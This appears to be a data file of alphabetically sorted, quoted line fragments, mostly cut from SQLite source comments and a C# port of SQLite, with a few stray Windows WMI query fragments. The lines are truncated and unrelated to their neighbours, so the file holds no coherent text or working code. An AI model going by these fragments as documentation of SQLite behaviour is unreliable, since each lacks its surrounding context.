" except when the table has an INTEGER PRIMARY KEY column, in which"
" executed a BEGIN.  On Db.flags, SQLITE_InTrans means a statement"
" executed using [sqlite3_step()].  If there is an error, "
" executed. The context stores the last insert row id, the last statement"
" exist on the table t1, a complete scan of the data might be"
" exist, the error is caught by the block below."
" existing savepoint, P1==1, or to rollback an existing savepoint P1==2."
" exists purely as a contingency, in case some malfunction in some other"
" exists, that is probably an old journal left over from a prior"
" exists, this function falls back to sqlite3Malloc()."
" exits.  Upon entering a before or instead of trigger, lastRowid is no"
" expected to open it on an index b-tree. Otherwise, if pKeyInfo is"
" expecting an index b-tree, then the caller should be inserting blob"
" expects pointers to be UTF-16 strings in the native byte order, or the"
" experience from use ""in the wild"" suggest such changes are prudent."
" expiration of the handle, though of course those changes might"
" explicitly declared [INTEGER PRIMARY KEY] column, then the output"
" expression depth allowed. If it is not, leave an error message in"
" expression is used as a result in an aggregate SELECT, then the"
" expression lists, ID lists, and select statements.  The copies can"
" expression or subquery, then a NULL pointer is returned."
" expression, do not allow aggregates in any of the other expressions."
" expression.  Attempt to store the results in register ""target""."
" expressions are the same.  But if you get a TRUE return, then you"
" extended error code is set to SQLITE_LOCKED_SHAREDCACHE. Otherwise, in"
" extension loading while evaluating user-entered SQL, the following API"
" extern ""C"" "
" external API. It works in a similar way to sqlite3_value_text(),"
" extracted in pre-sorted order.  If that is the case, then the"
" factoring out of a loop, then evaluate the expression"
" fail, since no attempt to allocate dynamic memory will be made."
" fail.  This is a very unreasonable result, but windows is notorious"
" failing, it fails consistently until mallocFailed is reset."
" fails and any prior changes from that one operation are backed out,"
" fails to zero-fill short reads might seem to work.  However,"
" fails, SQLITE_NOMEM is returned and the page size remains unchanged."
" fails, SQLITE_NOMEM is returned. Otherwise, if no IO or malloc errors"
" failure occurred while the journal was being written, it could be the"
" fall through to the next instruction, just as an OP_Next does if"
" false and assert() is enabled, then the assertion fires and the"
" fatal. For example, if a malloc fails while resizing a hash table, this"
" field, the checksum-initializer and the database size at the start"
" file by this or any other process. If such a lock is held, return"
" file consists of pages, there are no more journal headers. Compute"
" file format.  Depending on how it is changed, you might not notice"
" file has not yet been created, create it now."
" file in the file-system. This only happens when committing a transaction,"
" file looking for lines that begin with ""case OP_"".  The opcodes.h files"
" file open, we will be unable to delete it.  To work around this"
" file or rolling back a journal file, the IO error code is returned."
" file simultaneously, or one process from reading the database while"
" file was of zero-length, then the DB_Empty flag is also set."
" file where they can be truncated off.)  Hence, it is not possible"
" file, not the main database file."
" file, then it is copied into the buffer pointed to by zMaster. A"
" file.  Code should use the MACRO forms below, as the Varint32 versions"
" file. Before writing to meta[6], check that meta[3] indicates"
" fileExists( db, ""vdbe_explain"" ) != 0 )"
" first parameter, szPage, is the size in bytes of the pages that must"
" first then the size of the file is extended, never the other"
" first time this function is called for a given VDBE, not when it is"
" first trunk in the free-list is full. Either way, the page being freed"
" first use of table pTab.  On 2nd and subsequent uses, the original"
" first zero terminator. If nByte is non-negative, then it is the maximum"
" flag is set, return without doing anything. The pcache layer will"
" flag is set, then break the tie by treating key2 as larger."
" flag on jump instructions, we get a (small) speed improvement."
" flags, iDb)"
" flags, pTab->tnum)"
" followed by any ORDER BY, LIMIT and/or OFFSET clauses. This block"
" following the ""ROLLBACK TO sp"" statement, reading page X will read"
" following the value in pPager.journalOff, assuming a sector"
" for """
" for SQL.  So this routine always uses ""."" regardless of locale."
" for backwards compatibility, but their use is discouraged."
" for each column in the table, according to the affinity of the column:"
" for each column indexed by the index, according to the affinity of the"
" for function overloading.  But we use the B term in ""glob(B,A)""."
" for garbage data to be appended to the file, the nRec field"
" for lines of that contain ""Opcode:"".  That line and all subsequent"
" for probabilistic locking in Win95/98/ME.  Hence, the locking scheme"
" for some other purpose during a backup operation, things may appear to"
" for the TEMP database. This is loaded last, as the TEMP database"
" for the lock to become available on p, then relock all of the"
" for the trigger being coded (for example an ON DELETE trigger), then newIdx"
" for this, if the application does use the destination [database connection]"
" for virtual tables), do not include it in the expanded"
" form """
" format to 2. If the default value of the new column is not NULL,"
" forms the result set entry (""a"
" found, or NULL if there is no match."
" found, the corresponding affinity is returned. If zType contains"
" four bytes of it, and this function does not need the first"
" freed. If pFrom contains ephemeral data, a copy is made."
" from @mattifestation, whose PowerShell source is here:"
" from Win32_DiskDrive where SystemName = '"" "
" from Win32_LogicalDisk where DeviceID = '"" "
" from Win32_Process WHERE processID="" "
" from [sqlite3_open()], [sqlite3_open16()], or"
" from [sqlite3_value_blob()], [sqlite3_value_text()], or"
" from a normal transaction rollback, as no locks are released and the"
" from default, or when 'file' and the temp_store_directory has changed"
" from its hash chain. Also, if the PgHdr.needSync was set for"
" from pPayload to the buffer pointed at by pBuf. If eOp is true,"
" from the P4 parameter of the OP_Column instruction, is returned instead."
" from the aVTrans[] array, if applicable "
" from the comments following the ""case OP_xxxx:"" statements in"
" from the index in preference to the table. Sometimes, this means"
" from the main database is substituted, if one is available."
" from the open BLOB, starting at offset iOffset."
" from the previous row currently stored in a0, a1, a2..."
" from this function, not directly by the user."
" from this list when a transaction is committed or rolled back, or when"
" from within OsOpen()), but some third-party implementations may."
" from, or ready to be written to, the database file. By implementing a "
" full-synchronous mode, sync the journal first. This ensures that"
" function has already been called, it is mostly a no-op.  However, any"
" function is 0, then the data area associated with page 1 is zeroed, but"
" function is running and thus changes the last insert [rowid],"
" function is used to read database headers, and a new transient or"
" function parameter has changed since the meta-data was set,"
" function returns SQLITE_OK. Otherwise, an IO error code is returned."
" function returns the index of the named database in db->aDb[], or"
" function was called, or because the memory allocation attempt failed,"
" function, SQLite calls this function with zBuf pointing to"
" function.  The expression ""A glob B"" is equivalent to"
" function. However, if a malloc() failure has occurred since the previous"
" function. If an error occurs while doing so, return 0 and write an"
" function. If this were not verified, a subtle bug involving reuse"
" functions to enable blocking locks with timeouts, to change the"
" garbage data came from an obsolete journal file, the checksums might"
" generate call themselves recursively, the first part of the structure"
" generated, the subroutine that does the cookie verifications and"
" generates two C files ""opcodes.h"" and ""opcodes.c"" by scanning this"
" generating code because of a call to sqlite3NestedParse(), do not"
" generating the code for each operand, set the EP_AnyAff"
" get2byte(data, pbegin "
" get2byte(data, pnext "
" getMask( pMaskSet, pOrTerm.leftCursor ) ) == 0 )"
" getMask( pMaskSet, pTabList.a[bestJ].iCursor ) ) != 0 )"
" global LRU list, if is part of it. If pPage is not part of the global"
" goes wrong, the transaction on pTo is rolled back. If successful, the"
" grammar defines an error token ""ERROR""."
" greater than key2.  The {nKey1, pKey1} key must be a blob"
" greater than or equal to the key and P2 is not zero, then jump to P2."
" group_concat(EXPR, "
" handle ""db"". The error code is set to ""err_code""."
" handle invalid, and will not use it with any other sqlite3_pcache_methods"
" handle is not locked in this routine, but it is locked in"
" handled as a fatal error by SQLite, vfs implementations should endeavor"
" handler could result in a deadlock, it will go ahead and return [SQLITE_BUSY]"
" handling (to get a smaller binary), the following minimal version"
" happen while processing an ""INSERT INTO ... SELECT"" statement), it"
" happens, it is the responsibility of the caller to invoke the correct"
" happens, the next interation of the do-loop will balance pParent"
" happens, the overflow cell is stored in the aBalanceQuickSpace[]"
" has a zero-filled tail, turn it into an ordinary"
" has been added, it is set to point to the database connection"
" has been modified, ""trip"" or invalidate each cursor in"
" has been modified.  If the database has changed, flush the"
" has been rolled back, update the database connection change-counter."
" has completed, it is safe to release the pSpace buffer used by"
" has just been created, it contains no data and the index initialization"
" has made changes and is in autocommit mode, then commit those"
" has nFin>0.  A ""PRAGMA incremental_vacuum"" has nFin==null."
" has never appeared before, reuse the same variable number"
" has no indices, the WHERE clause on the outer query cannot be"
" has not been allocated, allocate it now. The array is sized at"
" has not yet returned [SQLITE_DONE], then any active write-transaction on the"
" has to go to disk, and could also playback an old journal if necessary."
" hash table.  When multiple functions have the same name, the hash table"
" have a name which is the string """
" have accumulated. {H12343} After ""ms"" milliseconds of sleeping,"
" have been filled out.  If the schema changes, these column names might"
" have ever occurred on that database connection, zero is returned."
" header. Since the pager is in exclusive mode, there is no need"
" held, this function is a no-op. Otherwise, the size of the file is"
" help reduce memory requirements, sometimes an Expr object will be"
" hit only, not a fatal error)."
" hook returning non-zero, just as it would be with any other rollback."
" hours since midnight - [0,23] "
" i is out of range, then return false."
" i, iTo "
" i, ignoreDest )"
" i, p.pResultSet[i] )"
" i, pIdx.tnum )"
" i, r1, pIdx.nColumn "
" i-- )//, a"
" i-- )//, pItem"
" i-- )//, pOrTerm"
" iTable. If a read-only cursor is requested, it is assumed that"
" i], 0, data, cellbody, aSize[i "
" identical, we return FALSE just to be safe.  So if this routine"
" identifier, or a number.  If minusFlag is true, then the value is"
" identifiers are treated as strings, not possible column names or aliases."
" idx, p.aMem[p1 "
" idx, p.aMem[p2 "
" idx, regIdx "
" idx, serial_type )"
" idx--, rounder "
" idx--, rounder"
" idx1, serial_type1 )"
" idx], p.aMem[p2 "
" idx], pColl )"
" if >0, constraint is part of argv to xFilter "
" if P2==OE_Fail. Do the rollback if P2==OE_Rollback.  If P2==OE_Abort,"
" if P3 is the same register as P2, the implementation is able"
" if P4 is not 0.  If P4 is not NULL, it points to a KeyInfo structure"
" if SQLITE_OMIT_TRACE is defined, the OP_Trace is omitted and we do need to"
" if SQLite is unable to allocate memory to hold the [sqlite3] object,"
" if SystemTimeToFileTime() fails, it returns zero. "
" if an intkey page appears to be the parent of a non-intkey page, or"
" if any. Before returning, "
" if in full-sync mode), the zero is overwritten with the true number"
" if isDirect is non-zero, then the database file is updated directly"
" if memRootPage is not negative, it means that the index is newly"
" if nFin is non-zero. In that case, the free-list will be"
" if pLimit is null, pOffset will always be null as well. "
" if the allocation fails. Otherwise, zero the new portion in case a"
" if the assumption were not true, and it is not possible for the flags"
" if the child journal exists, and if so"
" if the number of terms is too large.  In practice, most SQL"
" if the page is on the free-list at the start of the transaction, then"
" if the pager is not in no-sync mode, sync the journal file immediately"
" if there are no other BLOBs, no pending prepared statements, and the"
" if there are row triggers, allocate a temp table for new."
" if there is one.  But if there was previously a read-lock, do not"
" if there wasn't a hash collision, and this doesn't "
" if we are not initializing, and this trigger is not on a TEMP table,"
" if zNum is less than, equal to, or greater than the string."
" ignored.  For a ZERODATA table, the pData and nData are both ignored."
" ignored.  If the rowid cache has never before been set, then a"
" immediately. Instead, they are moved from the Table.pVTable list to"
" implement a loop.  This test used to be on every single instruction,"
" implementation is available on the host platform, the mutex subsystem"
" implementation, using the [SQLITE_CONFIG_GETMUTEX] option."
" implementations, SQLite uses this random number generator based"
" implemented by sqlite3_mutex_try().  On those systems, sqlite3_mutex_try()"
" in Debug.Assert() expressions, so it is only compiled if NDEBUG is not"
" in Greenwich on November 24, 4714 B.C. according to the Gregorian"
" in RedHat 6.0, so the code won't work.  Hence, for maximum binary"
" in WHERE clause processing.  So as currently implemented, there is"
" in a UNIQUE index.  This is the way PostgreSQL, Oracle, DB2, MySQL,"
" in a corrupted state. So if this routine fails, the database should"
" in a way that is testable, mask the sign bit off of negative"
" in case this has happened, clear the changeCountDone flag now."
" in connection handle pDb. If such a database cannot be found, return"
" in database iDb. If so, this is an error."
" in hash, if not, try to find a spot for it "
" in memory obtained from [sqlite3_malloc()].  To avoid a memory leak,"
" in memory, this routine goes to disk to read it in whereas Lookup()"
" in other words, the same BLOB that would be selected by:"
" in p.a[0] and p.a[1], respectively.  The parser initially stores the"
" in pEList have an <id> which matches an identifier in pIdList,"
" in pParse.pNewTrigger.  After the trigger actions have been parsed, the"
" in pZ (or up until the first pair of 0x00 bytes, whichever comes first)."
" in prereqRight and prereqAll.  The default is 64 bits, hence SQLite"
" in read/write mode.  For a given table, there can be one or more read-only"
" in row iRow, column zColumn, table zTable in database zDb"
" in shared cache.  This variable has file scope during normal builds,"
" in the B-Tree.  When that happens, use sqlite3VdbeMemFromBtree() to"
" in the ON DELETE, ON UPDATE and ON INSERT clauses."
" in the SELECT statement, then no indexes are considered. However, the"
" in the Vdbe.azVar[] array, if such a mapping does not already"
" in the batch number.  In other words, if an INSERT occurs between"
" in the database file is given by P1.  But, unlike Destroy, do not"
" in the database file. And if an IO error occurs while doing so,"
" in the database native encoding, the collation factory is invoked to"
" in the database text encoding of name zName, length nName."
" in the name of the object stands for ""virtual file system""."
" in the record in register P3, where N is the total number of values in"
" in the rollback journal, it is not put there by by this routine."
" in the table, and in that case, 5"
" in the table, it is faster to do a linear search than to manage"
" in this file for details.  If in doubt, do not deviate from existing"
" in1, in2 "
" include ""DEFAULT CURRENT_TIME"" etc."
" include ""fts3.h"""
" include ""rtree.h"""
" include ""sqliteicu.h"""
" including the new anonymous savepoint, open on the B-Tree. i.e. if there"
" incomplete, it is required that:"
" inconsistent state, for example with (Mem.z==0) and"
" inconsistently.  And many do not understand the ""LL"" notation."
" increasing order.  Because a freeblock must be at least 4 bytes in size,"
" incremented (otherwise not).  If the OPFLAG_LASTROWID flag of P5 is set,"
" indentation conventions, each case should be indented by 6 spaces.  But"
" independent of the look-ahead.  If it is, return the action, otherwise"
" index iSavepoint. If it is SAVEPOINT_ROLLBACK, then rollback all changes"
" index of the named database in db->aDb[], or -1 if the named db"
" index of trigger ""new"" temp table       "
" index of trigger ""old"" temp table       "
" index, then we will continue to process this index."
" indicating a table b-tree, or if the caller did specify a KeyInfo"
" indices of that table.  The ""baseCur"" parameter is the cursor number used"
" indices, you might also think of this module as the ""query optimizer""."
" indices.  Hence, the record number for the table must be allocated"
" individual journal file, or is NULL, indicating no master journal file"
" inequality.  To avoid this, make sure to also run the full"
" info.iOverflow, (int)iTo)"
" information is in static, unmanaged space and does not need to be freed."
" information needed to terminate the loop.  Later, the calling routine"
" inital value of lowestCost in this loop. If it is, then the"
" initialize the mutex subsystem, return early with the error."
" initialized. If the main database exists, the new sqlite.enc value"
" initially NULL, then create a new expression list."
" initially be zero, however. "
" inner loops (or around the ""..."" if the test occurs within the inner-"
" input does not begin with a quote character, then this routine"
" insert, update, or delete statement.  It remains constant throughout the"
" insertCell(), so reparse the cell now."
" inserted, there is no need to search to see if the same value was"
" install the default pluggable cache module, assuming the user has not"
" installation.  Memory allocation errors are detected, but"
" instance of the following structure, stored in the sqlite3.aModule"
" instance of the wildcard, the next sequenial variable number is"
" instead of an 8-byte one. This all works fine, except that when"
" instruction ended up not being needed, then change the OP_OpenEphemeral"
" instruction into a TK_NULL.  If the auth function returns SQLITE_DENY,"
" instructions yet, leave the main database error information unchanged."
" integer, stored as a varint."
" integer, then set "
" integers, for space efficiency, but after extraction we want them"
" interface defined here.  As a consequence, errors that occur in the"
" interface fixed, support it indefinitely, and remove this comment."
" interface, and routines that contribute to loading the database schema"
" interfaces [sqlite3_prepare()] or [sqlite3_prepare16()], this function"
" interfaces in the middle of this structure, then older different"
" interfaces use UTF-8, and sqlite3_prepare16() and sqlite3_prepare16_v2()"
" interfaces, the underlying reason for the error is returned immediately."
" internal memory allocation needs. ""Core"" in the previous sentence"
" intkey b-tree, then cell i is a divider cell.  "
" intkey b-tree, then cell i was a divider cell. "
" intkey table (an SQL table, not an index). In this case the row change"
" intkey table, the caller should be inserting integer keys with a"
" into aSpace1[].  In this way, all cells in apCell[] are without"
" into buffer zBuf, length nBuf."
" into pAmt.  If pAmt==null, then the value returned will not be"
" into pParent, which may cause pParent overflow. If this"
" into the RowSet. If it is already present, control skips the"
" into the desired format, then invoke sqlite3_column_bytes() or"
" into the open BLOB, starting at offset iOffset."
" invalid, then the process that wrote the journal-header must have"
" invalidated if some other cursor writes to the same table, or if"
" invoke it now. If the module has not been registered, return an "
" invoke sqlite3_initialize() directly.  For example, [sqlite3_open()]"
" invoke the busy handlers, neither will make any progress.  Therefore,"
" invoked immediately. If the application then re-attempts the ""DROP TABLE"""
" invoking an external callback, free it now. Calling this function"
" is ""main"" for the main database, ""temp"" for the temporary database, or"
" is 0x00000000ffffffff.  But because of quirks of some compilers, we"
" is a ""virtual"" database for transient use only and is deleted as"
" is a NULL pointer, then SQLite performs a search for an appropriate"
" is a disk table or the ""old."
" is a string or blob, then the copy is only a pointer to the"
" is a temp table. If so, set the database to 1. Do not do this"
" is added to the freelist instead of iTable.  In this say, all"
" is added to the internal hash tables, assuming no errors have"
" is an UPDATE and the primary key is not changing, that is OK."
" is an integer), then SQLite create a static array of at least"
" is are ""%q"", ""%Q"", and ""%z"" options."
" is associated with individual values, not with the containers"
" is because when memory debugging is turned on, these two functions are"
" is being committed. In this case, it is guaranteed that the database page"
" is being overridden/deleted but there are no active VMs, allow the"
" is better to execute the op on an index, as indexes are almost"
" is called from an UPDATE or DELETE statement, then ppOrderBy is NULL."
" is called page 1.  0 is used to represent ""not a page""."
" is called, then [SQLITE_LOCKED] is returned immediately. Again, in this"
" is called. Before writing anything to the database file, this lock"
" is changed to a Noop.  In this way, we avoid creating the statement"
" is coming from a SELECT statement, then generate a co-routine that"
" is created. If an existing main database file is opened, then the"
" is dangerous, as if a failure occurred whilst writing to the journal"
" is defined, and NDEBUG is not defined, an Debug.Assert() statement checks"
" is delivered up to the client application, the string will be automatically"
" is different for every journal, we minimize that risk."
" is disabled, so we might as well hard-code pTab->dbMem to NULL. "
" is either the integer 0, the floating point number 0.0, or a NULL"
" is enabled, then the return value is true.  If X is true and"
" is encountered, this indicates corruption."
" is equal to YY_SHIFT_USE_DFLT, it means that the action is not in the table"
" is executed, this is done before the ATTACH operation."
" is extracted from the free-list and reused, then the original data"
" is false, the SQLITE_MASTER table is only parsed if the rest of the"
" is greater than the current value of Pager.dbSize, then playback is"
" is held or not held, respectively, by the calling thread."
" is ignored as well.  Hence, this routine only compares the prefixes "
" is implemented as like(B,A)."
" is impossible here.  If the original size measurement failed, then"
" is invoked, even for queries."
" is less than or equal to zero, the subroutine is a no-op.  If"
" is made to store the column value in register iReg, but this is"
" is modified by an INSERT, DELETE, or UPDATE statement.  In standard SQL,"
" is moved, the pointer in its parent must be updated to point to the"
" is named in the IDLIST, then record in the keyColumn variable"
" is negative, then SQLite takes result text from the 2nd parameter"
" is non-negative, then as many bytes (not characters) of the text"
" is non-zero, then it is the root page number of a table moved to"
" is not -1, then the unsynced portion of an open journal file may"
" is not NULL, then the callback will be invoked with two arguments."
" is not an aggregate or DISTINCT query, and"
" is not applicable to this transaction, call sqlite3JournalCreate()"
" is not defined), then it is important to call OP_Destroy on the"
" is not itself part of a compound select,"
" is not large enough, [SQLITE_CANTOPEN] should be returned. Since this is"
" is not true. Otherwise, it runs once for each trunk-page on the"
" is not used, its name is just '{}'.  If no index is used"
" is not yet open, it is created and opened before any data is"
" is not, either fail an Debug.Assert or return zero. Otherwise, return"
" is not, the result is undefined."
" is only big enough to hold the non-zero prefix, then only write that"
" is passed -1 and nMem, nCursor and isExplain are all passed zero."
" is popped from the stack, then call it."
" is read-only, the others are read/write."
" is readable and writable, but it has no effect.  The return of a dummy"
" is requested, [sqlite3_snprintf()] is used internally to perform the"
" is requested, this is a no-op."
" is required to store the string, then value of pMem is unchanged.  In"
" is required, it is allocated and populated here. It is then"
" is returned, then the error count and error message in pParse are"
" is set to -1. The oldIdx member is analogous to newIdx, for old."
" is shared by multiple database connections.  Therefore, while parsing"
" is slightly different from resolving a normal SQL expression, because simple"
" is started if the second argument is nonzero, otherwise a read-"
" is stored. In this case, the vdbe program must ensure that the"
" is successful, then the value returned by sqlite3_last_insert_rowid()"
" is taken, as pager_wait_on_lock() is a no-op for temp-files."
" is that an IO error may have occured, causing an emergency rollback."
" is the appropriate response to an error, not COMMIT.  Guard against"
" is the case, clear the mallocFailed flag and return NULL."
" is the case, this routine might think there is a hot journal when"
" is the old value less one, less one more if that happens to"
" is the parameter to interrogate.  Currently, the only allowed value"
" is the root of a table b-tree - if it is not, the following call is"
" is the same as ""addrBrk""."
" is then deleted and SQLITE_OK returned, just as if no corruption had"
" is to fill in the TabResult structure appropriately, allocating new"
" is to say, if it is in between BEGIN and COMMIT)"
" is true, then immediately upgrade this to an EXCLUSIVE lock. The"
" is true, then the constraint is assumed to be fully handled by the"
" is unsafe, as is the call to sqlite3Error()."
" is updated accordingly. If page 1 is written out, then the value cached"
" is upgraded to an EXCLUSIVE lock. If the lock cannot be obtained,"
" is used, or the default (BINARY) if neither expression has a collating"
" is zero if the error message fits in the buffer, or non-zero"
" is zero, then the result is NULL."
" isDate( context, argc - 1, argv1, ref x ) != 0 ) return"
" isNT() is 1 if SQLITE_OS_WINCE==1, so this else is never executed."
" isSortingIndex( pParse, pWC.pMaskSet, pProbe, iCur, pOrderBy, nEq, ref rev )"
" isspace(), isalnum(), isdigit() and isxdigit(), respectively. The"
" it already exists in the table.  If it does not exist, we have"
" it by.  If pSpace is already 8-byte aligned, nOff should be zero."
" it is a keyword.  If it is a keyword, the token code of that keyword is"
" it is corrupted, then a process must of failed while writing it."
" it is generally named ""NotUsed"" or ""NotUsed2"" to make things even clearer."
" it is less than 512, or rounded down to MAX_SECTOR_SIZE if it"
" it is not, it is not possible to use any index."
" it is synced into the journal file. This way, it may end up in"
" it is, or 0 otherwise. At present, a query is considered to be"
" it is, return a pointer to the Mem for the value of that column."
" it must be turned on for each database using ""PRAGMA auto_vacuum = 1""."
" it returns SQLITE_DONE or an error, and that nFin is the"
" it to point to memory obtained from [sqlite3_malloc].  Furthermore,"
" it will either be zeroed, or contain the same data that it did when it"
" its current transaction, either by committing it or rolling it back. "
" its has a zero header, that might be due to an I/O error, or"
" its members, skipping duplicates."
" itself and the buffer referred to by Expr.u.zToken, if any."
" itself, not the number of bytes in the key."
" j, iRegStore )"
" j, pLevel.addrBrk )"
" j-- )//, pIn--)"
" j-- )//, pTerm"
" j--, i"
" j-=2, ptr-=2){"
" join, make sure the subquery has no WHERE clause."
" journal file in bytes is larger than this value, then truncate the"
" journal file name has already been written to the journal file,"
" journal file right after the header.  The random initializer is important,"
" journal file, then its content must be as they were when the"
" journal file. zMaster may be NULL, which is interpreted as no master"
" journal header. Normally, zero is written to this value at this time."
" journal name, where each byte is interpreted as a signed 8-bit integer."
" journal.  Otherwise, a power loss might leave modified data in the"
" journalled during a transaction, or which pages have the ""dont-write"""
" jump to instruction P2.  Or, if the virtual table has reached"
" jump, in1 "
" jump, in1, in3 "
" jump, in3 "
" jump, out3 "
" just deleted using OsDelete, "
" k-- )//, pItem"
" k-- )//, pTerm"
" key and data for any entry are combined to form the ""payload"".  A"
" key value of the loop.  If one or more IN operators appear, then"
" key, the set the keyColumn variable to the primary key column index"
" key.  The ""to"" table is the table that is named in the REFERENCES clause."
" keyColumn, regRowid )"
" keys, the VDBE layer invokes sqlite3BtreeLast() to figure out the"
" kind of mutex more than once, the behavior is undefined."
" label can be used as the P2 value of an operation.  Later, when"
" large enough to hold the entire field.  Except, if the field is"
" large file support, or if the OS is windows, these should be no-ops."
" large, default limits.  Databases managed by external sources can"
" larger (that is, because the requested allocation was larger than the"
" larger than the largest existing key, it is possible to insert the"
" larger than the maximum rowid in the memId memory cell, then the"
" larger.  As it happens, the pPKey2 will always be the longer"
" last digit.  So, for example,"
" leave the autoVacuum mode at 0 (do not auto-vacuum), even if"
" left of the compound operator - the ""A"" select."
" left-hand side is a SELECT statement.  P1 may be a true index, or it"
" less than or equal to the key and P2 is not zero, then jump to P2."
" less than the current cost stored in pCost, replace the contents"
" less than zero, [SQLITE_ERROR] is returned and no data is read."
" linked list of overflow pages. If possible, it uses the auto-vacuum"
" list contains too few elements, then construct an incomplete tree"
" list of ""ID = expr"" items in an UPDATE.  A list of expressions can"
" list, pPgnoNext is set to zero."
" literal NULL, then set pDflt to 0. This simplifies checking"
" literal default values specified: a number, null or a string. (If a more"
" loaded. Otherwise, the new index definition can be loaded along"
" locale of ""C"". They are implemented as macros in sqliteInt.h."
" localtime_r() available under most POSIX platforms, except that the"
" locate a page close to the page number ""nearby"".  This can be used in an"
" lock contention, return SQLITE_BUSY.  If SQLITE_BUSY is returned, it"
" lock on the database file. If exFlag is true, then acquire at least"
" lock, but not when obtaining the RESERVED lock."
" locked between calls to sqlite3_backup_step(), it may be modified mid-way"
" locked the sqlite3_master table, return SQLITE_LOCKED. If any other error"
" locking strategy (for example to use dot-file locks), to inquire"
" locks on the schema, we just need to make sure nobody else is"
" look like a number, leave it alone."
" looks like a number, convert it into a number.  If it does not"
" loop.  We would get the correct results if nothing were ever disabled,"
" loss of information, then special processing is required... "
" lower-case ASCII equivalent.  On ASCII machines, this is just"
" m.z : sqlite3DbStrDup( db, m.z )"
" macro defined (with ""-DSQLITE_MUTEX_APPDEF=1""), then no mutex"
" made clean for some other reason, but no error occurs, then SQLITE_OK"
" main database, set sqlite3.enc to the encoding of the main database."
" make it to the ""..."" in the middle of the loop.  After each ""foreach"","
" make our hash too ""full"".  "
" make use of additional special filenames that begin with the "":"" character."
" makes an exact copy.  But for any other kind of expression, this"
" malloc error occurs during a rollback, then this will itself cause"
" malloc() failure, but SQLite now does this automatically."
" malloc() has failed, the threads mallocFailed flag is cleared and the result"
" malloc(), free(), and realloc() functions from the standard library."
" malloc().  In this way, we know that the memory is safe to be"
" many fields that are declared ""const"" to prevent xBestIndex from"
" mask <<= 1, iDb"
" mask is set. If a column with an index greater than 32 is read, the"
" master journal file will be orphaned. But we cannot delete it,"
" match the new data. The initialization of pTo ""cannot"" fail, as the"
" may be NULL. If it is not NULL, then the update-hook"
" may be inserted. If both these operations are successful, proceed."
" may be invoked during, according to the comment above"
" may be lost. In the event of a rollback, it may not be possible"
" may not contain a value for the column and the default value, taken"
" may not have been opened yet, in which case the OsSectorSize()"
" may remain unchanged, or it may be set to an invalid value."
" means we do need to fix the database references, FALSE means we do not."
" memcmp( BitConverter.GetBytes( r1 ), BitConverter.GetBytes( t2 ), sizeof( double ) ) == 0 )"
" memcmp( aMagic, aJournalMagic, 8 ) != 0"
" memcmp( zBlob, izIn "
" memcmp( zBlob, izIn, azChar[i], len ) == 0 ) break"
" memcpy(pTo, pFrom, offsetof(sqlite3_mutex_methods, xMutexAlloc))"
" memory (actually, os_unix.c allocates a small amount of memory"
" memory allocation error, 0 on success, or non-zero for an error."
" memory allocation fails, then SQLITE_NOMEM is returned."
" memory, and returns a pointer to it. On second and subsequent calls to"
" memory, it returns a NULL pointer.  If the parameter N to"
" memory, the size of each page buffer (sz), and the number of pages (N)."
" memset(pPager.aHash, 0, sizeof(pPager.aHash))"
" messages have been generated, output OK.  Otherwise output the"
" might refer to an result-set alias.  This happens, for example, when"
" millisecond time resolution, then the time will be rounded up to"
" mimimum key value is 1. After it has been retrieved using xFetch, the page "
" minimum and maximum 64-bit integers, or they define them"
" minutes after the hour - [0,59] "
" misusing sqlite, they have bigger problems than a leaked value."
" mkkeywordhash.h, located in the tool subdirectory of the distribution."
" mnHeap, mxHeap "
" moLogDisk[""SystemName""] "
" mode, the following events may invalidate an overflow page-list cache."
" mode, then subsequent transactions performed by the connection will not"
" mode, then the journal file may at this point actually be larger"
" modifying the contents of pParent, which may cause pParent to"
" months since January - [0,11] "
" more conservative than necessary, but much easier than enforcing"
" more matches.  Either way, we have an error."
" more than once, the behavior is undefined."
" more than one of the substrings, entries toward the top of"
" most recent INSERT, UPDATE, or DELETE statement within the same"
" moved to become a free-list leaf page, the corresponding bit is"
" moves into the error state. Otherwise, SQLITE_OK is returned."
" moves, either by the OP_SeekXX, OP_Next, or OP_Prev opcodes.  The test"
" multiple invocations of the same SQL function during query execution, under"
" multiple times, it is invoked once with the set of void"
" multiply """
" must be NULL.  For index tables, pIdxKey is used and intKey"
" must be unique and what to do if they are not.  When Index.onError=OE_None,"
" must end with """
" must have P4==0, the final set P4=-1.  P4 must be either -1 or"
" mutex types, the same mutex is returned on every call that has"
" mutex, except for nRef and pNext which are accessed under the"
" mutex, not by sqlite3.mutex. They are used by code in notify.c."
" mutexIsNT() is only used for the TryEnterCriticalSection() API call,"
" n <= z.Length ) _p4.z = z.Substring( 0, n )"
" n is never more than NB (a small constant), that should"
" n, ref nPayload)"
" n, ref pInfo.nKey)"
" nArg==(int)(sqlite3DbMallocSize(db, aDyn)/sizeof(void"
" nCol, regBase "
" nDestPagesize, iSize )"
" nEq, addrNxt )"
" nIn - len, azChar[i], len ) == 0 ) break"
" nMaster, (u32)nMaster ) ) )"
" nOvfl is always positive.  If it were zero, fetchPayload would have"
" nRow it that is more than half number of rows in the table,"
" nSkip is non-zero, then pCell may not point to an invalid memory location"
" nSkip, sz - nSkip )"
" nSkip, sz - nSkip)"
" nSkip], pCell "
" name of a directory, then that directory will be used to store"
" name of the desired column, respectively. Neither of these parameters"
" name.  An expr/name combination can be used in several ways, such"
" named index. If no such plan is found, then the returned cost is"
" nameless, then NULL is returned.  The returned string is"
" names is done.)  The search order is TEMP first, then MAIN, then any"
" native byte order. When a collation sequence is invoked, SQLite selects"
" needs to be played back. According to this function, a hot-journal"
" negative integer.  This makes no sense, but it is what x86 hardware"
" negative rowids might run a little slower.  But in practice, zero"
" negative, zero or positive if pMem1 is less than, equal to, or greater"
" never be tested for, and (c) when a value that is part of set X is"
" new ""v2"" interface is recommended for new applications but the legacy"
" new free-list trunk page. Otherwise, it will become a leaf of the"
" new pSpace buffer, so it may be safely freed here. "
" newIdx : -1, appendFlag, isReplace == 0"
" no ELSE term, NULL."
" no match, or if pE is not a simple identifier, then this routine"
" no need to check the return values of the btree methods here, as"
" no such child journal can be found, file zMaster is deleted from"
" no-op if the schema is not currently loaded.  In other words, if P2"
" no-op. Otherwise, the actions required depend on the journal-mode"
" non 64-bit values to ptr types results in a ""hard"" error with"
" non-zero value is returned. Otherwise, 0 is returned and the output"
" non-zero, otherwise zero."
" non-zero. This is only used in debugging builds, as follows:"
" normally coordinate their activities, but we do need to coordinate the"
" not a published API of SQLite, is subject to change without"
" not arbitrary expresssions, we allowed some combining of LIMIT and OFFSET"
" not been deleted out from under the cursor, then this routine is a no-op."
" not big enough, space is obtained from sqlite3Malloc()."
